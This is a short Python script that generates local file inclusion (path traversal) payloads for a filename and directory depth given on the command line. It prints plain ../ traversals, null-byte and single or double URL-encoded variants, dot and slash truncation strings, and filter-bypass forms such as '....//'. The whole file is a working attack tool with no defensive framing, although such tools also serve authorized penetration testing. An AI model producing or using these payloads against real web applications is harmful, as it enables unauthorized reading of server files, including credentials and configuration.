import  urllib.parse
import random
import sys

def beautify():
    print("--------------------------------------------------------------------------------------------------------")

def gen_payload(filename,depth):
    #count=filename.count()
    depth_payload=str(('../')*depth)[:-1]
    
    #Basic lfi payload
    print("Basic LFI payload")
    print()
    basic_lfi=depth_payload+filename
    print(basic_lfi)
    beautify()
    #Payload with null byte encoding 
    print("Payload with null encoding")
    print()
    null_byte=basic_lfi+"%00"
    print(null_byte)
    beautify()
    #Payload with url encoding 
    print("Payload with url encoding ")
    print()
    single_url_encode=urllib.parse.quote(basic_lfi,safe='')
    double_url_encode =urllib.parse.quote(single_url_encode,safe='')
    print(single_url_encode)
    null_byte_url=double_url_encode+"%00"
    print(double_url_encode)
    print(null_byte_url)
    beautify()
    
    #Path and dot truncation
    print("Path and dot truncation bypass")
    print()
    psuedo_dots=random.randrange(8,12)
    truncated_payload1=basic_lfi+("."*psuedo_dots)
    print(truncated_payload1)
    psuedo_backslashes=random.randrange(5,10)
    truncated_payload2=basic_lfi+("\."*psuedo_backslashes)
    print(truncated_payload2)
    psuedo_fwdslashes=random.randrange(5,10)
    truncated_payload3=basic_lfi+("/."*psuedo_fwdslashes)
    print(truncated_payload3)
    depth1_payload=str(('../')*depth*2)[:-1]
    truncated_payload4=depth1_payload+filename
    print(truncated_payload4)
    beautify()


    #Common filter bypass tricks
    print("Common filter bypass techniques")
    depth2_payload=str(('....//')*depth)[:-1]
    filter_bypass1=depth2_payload+filename
    print(filter_bypass1)
    depth3_payload=str(('..////')*depth)[:-1]
    filter_bypass2=depth3_payload+filename
    print(filter_bypass2)
    depth4_payload=str(("/\..")*depth)
    depth4_payload_encoded=urllib.parse.quote(depth4_payload)
    filter_bypass3=depth4_payload_encoded+filename
    print(filter_bypass3)
    beautify()


if(len(sys.argv) != 3) :
    print(" [+] python genlfipaylaod.py dir depth")
else:
    filename=sys.argv[1]
    depth=int(sys.argv[2])
    gen_payload(filename,depth)
